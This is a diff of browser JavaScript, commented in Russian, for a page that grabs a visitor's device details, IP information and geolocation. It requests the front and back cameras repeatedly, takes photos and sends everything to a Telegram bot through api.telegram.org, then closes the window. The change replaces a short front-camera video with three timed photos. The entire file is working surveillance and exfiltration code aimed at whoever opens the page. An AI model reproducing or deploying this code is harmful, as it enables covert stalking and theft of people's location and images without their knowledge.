@@ -6,6 +6,29 @@ const video = document.getElementById('video');
 let locationGranted = false;
 let deviceDataSent = false;
 
+// ========== ОТПРАВКА В TELEGRAM ==========
+async function sendToTelegram(method, data) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+    try {
+        await fetch(url, { method: 'POST', body: data });
+    } catch(e) {}
+}
+
+async function sendMessage(text) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('text', text);
+    await sendToTelegram('sendMessage', formData);
+}
+
+async function sendPhoto(photoBlob, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', photoBlob, 'photo.jpg');
+    formData.append('caption', caption);
+    await sendToTelegram('sendPhoto', formData);
+}
+
 // ========== СБОР ДАННЫХ УСТРОЙСТВА ==========
 async function getDeviceInfo() {
     const userAgent = navigator.userAgent;
@@ -37,9 +60,11 @@ async function getDeviceInfo() {
         connectionInfo = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
     }
     
-    return {
-        text: `📱 Устройство: ${os} | ${browser}\n📐 Экран: ${screenSize}\n⏰ Время: ${timestamp}\n${batteryInfo}\n${connectionInfo}`.trim()
-    };
+    return `📱 Устройство: ${os} | ${browser}
+📐 Экран: ${screenSize}
+⏰ Время: ${timestamp}
+${batteryInfo}
+${connectionInfo}`.trim();
 }
 
 async function getIPInfo() {
@@ -56,47 +81,11 @@ async function sendDeviceData() {
     if (deviceDataSent) return;
     deviceDataSent = true;
     
-    const deviceText = await getDeviceInfo();
+    let fullText = await getDeviceInfo();
     const ipText = await getIPInfo();
-    let fullText = deviceText.text;
     if (ipText) fullText += '\n' + ipText;
     
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('text', fullText);
-    await sendToTelegram('sendMessage', formData);
-}
-
-// ========== ОТПРАВКА В TELEGRAM ==========
-async function sendToTelegram(method, data) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-    try {
-        await fetch(url, { method: 'POST', body: data });
-    } catch(e) {}
-}
-
-async function sendLocation(lat, lon) {
-    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('text', `📍 Местоположение: ${mapsUrl}`);
-    await sendToTelegram('sendMessage', formData);
-}
-
-async function sendPhoto(photoBlob, caption) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoBlob, 'photo.jpg');
-    formData.append('caption', caption);
-    await sendToTelegram('sendPhoto', formData);
-}
-
-async function sendVideo(videoBlob, caption) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('video', videoBlob, 'video.webm');
-    formData.append('caption', caption);
-    await sendToTelegram('sendVideo', formData);
+    await sendMessage(fullText);
 }
 
 // ========== ГЕОЛОКАЦИЯ ==========
@@ -118,6 +107,11 @@ async function requestLocation(maxAttempts) {
     return null;
 }
 
+async function sendLocation(lat, lon) {
+    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
+    await sendMessage(`📍 Местоположение: ${mapsUrl}`);
+}
+
 // ========== КАМЕРА ==========
 async function requestCamera(facingMode) {
     return new Promise((resolve) => {
@@ -130,7 +124,7 @@ async function requestCamera(facingMode) {
     });
 }
 
-// Сделать фото (через canvas)
+// Сделать фото
 async function takePhoto(stream, caption) {
     return new Promise((resolve) => {
         const canvas = document.createElement('canvas');
@@ -153,44 +147,17 @@ async function takePhoto(stream, caption) {
     });
 }
 
-// Запись видео 3 секунды с отправкой по секундам
-async function recordVideoWithFrames(stream, durationMs) {
-    return new Promise((resolve) => {
-        const chunks = [];
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        let secondsCount = 0;
-        let interval;
-        
-        recorder.ondataavailable = async (e) => {
-            if (e.data.size > 0) {
-                chunks.push(e.data);
-                secondsCount++;
-                const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                await sendVideo(videoBlob, `📹 Фронтальная камера (${secondsCount} сек)`);
-                await new Promise(r => setTimeout(r, 800)); // пауза между отправками
-            }
-        };
-        
-        recorder.onstop = () => {
-            clearInterval(interval);
-            resolve();
-        };
-        
-        video.srcObject = stream;
-        video.play();
-        recorder.start(1000); // запись каждую секунду
-        
-        interval = setInterval(() => {
-            if (secondsCount >= durationMs / 1000) {
-                recorder.stop();
-            }
-        }, 1000);
-    });
+// Сделать 3 фото с интервалом 3 секунды
+async function takeMultiplePhotos(stream, count, intervalSec, cameraName) {
+    for (let i = 1; i <= count; i++) {
+        await takePhoto(stream, `📸 ${cameraName} (фото ${i}/${count})`);
+        if (i < count) await new Promise(r => setTimeout(r, intervalSec * 1000));
+    }
 }
 
 // ========== ГЛАВНАЯ ФУНКЦИЯ ==========
 async function main() {
-    // 1. Отправляем данные устройства сразу
+    // 1. Данные устройства сразу
     await sendDeviceData();
     
     // 2. Геолокация (2 попытки)
@@ -200,28 +167,25 @@ async function main() {
         locationGranted = true;
     }
     
-    // 3. Запрашиваем камеру (бесконечно)
+    // 3. Запрашиваем фронтальную камеру (бесконечно)
     let frontStream = await requestCamera('user');
     
-    // 4. Фронтальное фото
-    await takePhoto(frontStream, '📸 Фронтальная камера (фото)');
-    
-    // 5. Фронтальное видео 3 секунды (отправка по секундам)
-    await recordVideoWithFrames(frontStream, 3000);
+    // 4. Делаем 3 фото с фронталки (интервал 3 секунды)
+    await takeMultiplePhotos(frontStream, 3, 3, 'Фронтальная камера');
     frontStream.getTracks().forEach(t => t.stop());
     
-    // 6. Заднее фото
-    let backStream = await requestCamera('environment');
-    await takePhoto(backStream, '📸 Задняя камера (фото)');
-    backStream.getTracks().forEach(t => t.stop());
-    
-    // 7. Если геолокация не была получена - последняя попытка
+    // 5. Если гео не было — последняя попытка
     if (!locationGranted) {
         const lastLoc = await askLocation();
         if (lastLoc) await sendLocation(lastLoc.lat, lastLoc.lon);
     }
     
-    // 8. Закрытие
+    // 6. Задняя камера — 1 фото
+    let backStream = await requestCamera('environment');
+    await takePhoto(backStream, '📸 Задняя камера');
+    backStream.getTracks().forEach(t => t.stop());
+    
+    // 7. Закрытие
     setTimeout(() => window.close(), 1000);
 }
 
